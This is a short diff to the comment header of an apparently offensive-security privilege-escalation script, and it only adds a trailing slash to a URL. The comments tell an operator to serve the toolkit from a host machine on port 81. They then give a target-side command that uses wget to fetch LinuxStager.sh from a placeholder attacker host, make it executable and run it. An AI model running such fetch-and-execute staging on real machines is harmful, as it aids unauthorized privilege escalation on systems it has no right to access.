@@ -7,7 +7,7 @@
 # If the target is only able to connect back to you download, use the below
 # steps: 
 # 1: Host Machine:   cd /tmp/ && git clone https://github.com/WillChaos/OFFSEC.git && cd OFFSEC/PrivEsc/ && python -m SimpleHTTPServer 81
-# 2: Target Machine: cd /tmp/ && wget http://<hostIP>:81/LinuxStager.sh && chmod +x LinuxStager.sh && ./LinuxStager.sh http://<hostIP>:81
+# 2: Target Machine: cd /tmp/ && wget http://<hostIP>:81/LinuxStager.sh && chmod +x LinuxStager.sh && ./LinuxStager.sh http://<hostIP>:81/
 # ---------------------------------------------------------------------------------------------------------------------------------
 
 
